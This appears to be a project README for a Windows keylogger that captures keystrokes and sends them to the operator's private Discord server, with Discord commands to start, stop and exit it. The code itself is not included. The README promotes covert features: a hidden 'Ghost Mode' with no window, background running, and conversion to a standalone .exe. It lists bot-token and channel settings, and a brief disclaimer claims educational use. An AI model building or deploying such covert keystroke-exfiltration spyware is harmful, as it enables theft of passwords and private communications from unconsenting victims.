<h1 align="center"> Key Capture & Discord Remote Control</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.11-blue?style=for-the-badge&logo=python" alt="Python Version">
  <img src="https://img.shields.io/badge/Platform-Windows-lightgrey?style=for-the-badge&logo=windows" alt="Platform">
</p>

<p align="center">
  <b>An advanced monitoring and remote control tool integrated with the Discord API.</b>
  <br />
  Capture, transmit, and manage processes in real-time without the need for local environments.
</p>

---

## 📖 Description

This project integrates system event capturing (keystrokes) with the power of Discord bots. It allows for fluid and readable monitoring of alphanumeric characters, sending the information directly to your private server.

> [!IMPORTANT]
> Designed to run in the **background** and convertible to an executable (.exe) for maximum portability.

---

## 🚀 Key Features

* **⚡ Real-Time Transmission:** Instant data delivery to Discord.
* **🧼 Smart Filtering:** Clean capture of alphanumeric and numeric keypad characters (ignores function keys and Enter to reduce noise).
* **👻 Ghost Mode:** Ability to run hidden without a command window.
* **📦 Zero Dependencies:** The final executable works on machines without Python installed.

---

## ⚙️ Configuration Parameters

You can customize the tool's behavior by adjusting the following variables in the source code (`loggercode.py`):

### 🔑 Credentials
* `TOKEN`: Your secret Discord bot token.
* `CHANNEL_ID`: The destination text channel ID.

### ⏲️ Performance Settings
* `INTERVALO_ENVIO = 5`: Time in seconds between each transmission.
* `LONGITUD_MAXIMA_LOG = 1500`: Accumulated character limit before forcing a message send.

---

## 🎮 Control Panel (Discord Commands)

Manage the tool remotely by sending messages to the configured channel:

| Command | Action | Status |
| :--- | :--- | :--- |
| `!start` | Activates keystroke capture | 🟢 Running |
| `!stop` | Pauses capture temporarily | 🟡 Paused |
| `!exit` | Terminates the process completely | 🔴 Terminated |

---

## 🛠️ Installation & Requirements

### Pre-requisites
* Python 3.11+
* Discord account + Private server.

### Environment Setup
```bash
# Clone the repository
git clone [https://github.com/themanoftheredshadow/Transparent](https://github.com/themanoftheredshadow/Transparent)

# Install dependencies
pip install -r requirements.txt
```
## ⚠️ Legal Disclaimer

> [!WARNING]
> **The author of this project is NOT responsible for any misuse of this tool.**This software is provided for **educational purposes and ethical auditing only**. Monitoring devices without explicit consent is illegal and violates privacy laws. By using this code, you accept full responsibility for your actions.

---
